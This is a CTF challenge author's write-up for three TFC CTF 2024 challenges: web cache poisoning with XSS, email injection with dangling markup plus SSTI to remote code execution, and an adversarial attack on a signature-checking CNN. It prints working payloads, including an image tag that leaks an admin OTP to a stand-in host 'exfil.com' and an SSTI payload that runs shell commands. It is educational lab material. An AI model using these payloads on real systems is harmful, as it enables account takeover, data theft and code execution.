# TFC CTF 2024 Challenges

Here are the sources and solutions for the challenges I created for TFC CTF 2024:

## PNGiphy - Web

PNGiphy was a HARD web challenge involving Cache Poisoning coupled with XSS.

After navigating on the platform, we can see that image upload is possible. However, no sanitization is in place, so we can upload any file, like a valid JS or HTML and it will be saved under `/static/images/<id>`.

Also, images can be reported to a bot that will visit them. But the bot only visits `/?image=imageid`, which loads the corresponding uploaded file into an `img` tag, so XSS should not be possible.

After a closer look, we can see caching is enabled in nginx.conf:

```
proxy_cache_valid 200 301 1m;
proxy_cache_key "$scheme://$hostname$uri";
```

But the cache key is not properly used, leading to cache poisoning.
That is because, in nginx, the `$uri` parameter does not include the parameters and the fragment part. So those will not be included in the cache key. However, when the request is forwarded, golang does not interpret the hash character (`#`) as the beginning of a fragment, thus including it in the path.

It should also be noted that golang normalizes the paths, so a request to `a/b/../c` will return a redirect to `a/c`.

The cache poisoning should begin like this:
* Upload a file with a js payload (containing the XSS payload) and get its id
* Wait 1 minute for the cache to clear and then navigate to `/static/main.js#/../images/<id>` in order to trigger a new cache.
* The cache will be poisoned (cache key will be `/static/main.js` and will be served as a 301 redirect to `/static/images/<id>`)
* Report any image id and, when the bot will load the page, `/static/main.js` will be fetched by the browser, thus rendering our cached file contents and and the XSS payload will be executed

From there just get the leaked flag from the cookie.

## Phisher - Web

Phisher was a HARD-INSANE web challenge, involving information disclosure through email injection + dangling markup, as well as RCE through Race-Condition + SSTI.

The application is split into two parts.

The first one, under `mail.phisher.tfc`, is an inbox application. Users can register under any email and will receive messages. On the other one, `dashboard.phisher.tfc`, the login is implemented using OTP codes, which are sent in the respective's user inbox.

After logging in on the dashboard, users will be able to send referrals to other users, including custom messages. This is done using jinja's `render_template_string`. But, no SSTI is possible when sending a simple message. There is also a specific admin functionality, `bulk_send`, which allows sending multiple messages to users.

### Step one
The first step should be gaining admin access. In order to do this, we should leak his OTP somehow. Note that, in the email body, the user's email is rendered unsanitized. So, we could try injecting some HTML. However, the iframe is sandboxed, so XSS can not be achieved inside the rendered email preview.

Why is entering HTML tags possible? Because `flask_mail` parses the email address this way: If the `<` and `>` tags are present in the email, it will take the address between the tags as the recipient. Everything else is ignored:

```py
>>> import email.utils
>>> email.utils.parseaddr('test<admin@phisher.tfc>test<h1>')
('test', 'admin@phisher.tfc')
```

So, the above payload will actually be sent to the admin user and will be rendered unsanitized inside the email body. But how can we exfiltrate the OTP?

Here comes [Dangling Markup](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) to our help. Entering a payload like `test<admin@phisher.tfc>test<img src="http://exfil.com/?x=` will result in the whole content before the first quotes being included in the image tag. This includes the OTP, which will be included in the exfiltration URL (`http://exfil.com/?x=,</p>            <p>Here is your code: <b>16919426</b></p>        </div>        <div class=`), thus leaking the admin's code.

After getting the admin code, we can login into his account. Now we have access to the full dashboard functionality.

### Step two
For the second part, the main issue resides in the `bulk_send` functionality. While normal users can only send one message at a time, admin users can enter emails separated by a comma and the backend will create a queue of messages. After that, the backend attempts to include the referral message in **all** the queue emails, without checking if they are already rendered:

```py
def send_bulk(self, sender_email, rcpts, message):
    self.queue.extend(Referral(sender_email, rcpt) for rcpt in rcpts)
    for referral in self.queue:
        referral.include_message(message)
```

So, if the queue is not empty when the request is made, `render_template_string` will be called again on the old items, meaning double template rendering, which results in SSTI.

The plan is as following: Send a request with `{{[].__class__}}` in the message field and a batch of emails separated by comma in the emails field. This will fill the queue with emails that contain the above payload in the message field. Then, send another request similar to the previous one (make sure the timespan between the two requests is very short in order to win the race condition). Immediately when the second request is parsed, the queue will still have some emails that need to be parsed from the first request. Jinja's `render_template_string` will be called again on them and our previously included payload in the message (which initially was harmless), will now be executed. Then, the user will receive a bunch of emails, some of them containing the SSTI results.

Because template rendering escapes quotes, the final payload should be like this: `{{[].__class__.mro()[1].__subclasses__()[370](request.args.cmd,shell=True,stdout=-1).communicate()[0].strip()}}` with the GET argument `?cmd=cat+/flag.txt`.

### Note:

The only team that solved the challenge, **COR (.;,;.)**, actually found an unintended solution to the first part of the challenge. Instead of using `dangling markup` in the email body, they managed to trigger an actual XSS on the email site, because the `From:` field from the email list was not sanitized. Thus, they bypassed the sandbox and leaked the OTP directly from outside the iframe. You can read their writeup [here](https://cor.team/posts/tfc-ctf-2024-phisher/). Congrats to them for the third place!

## Signature - AI/ML

Signature was a MEDIUM Machine Learning challenge involving adversarial attacks.

The website is waiting for a photo with a signature in order to authenticate the user. If the signature matches, the flag is returned.

The signature matching is performed using a CNN model, `model.h5`. In order to retreive the image that the model learned as being valid, a couple of attacks could be performed: `input layer attack` and `gradient tape`. These two are similar. You can find the exploit scripts inside the `solver/` folder of the `Signature` repo.
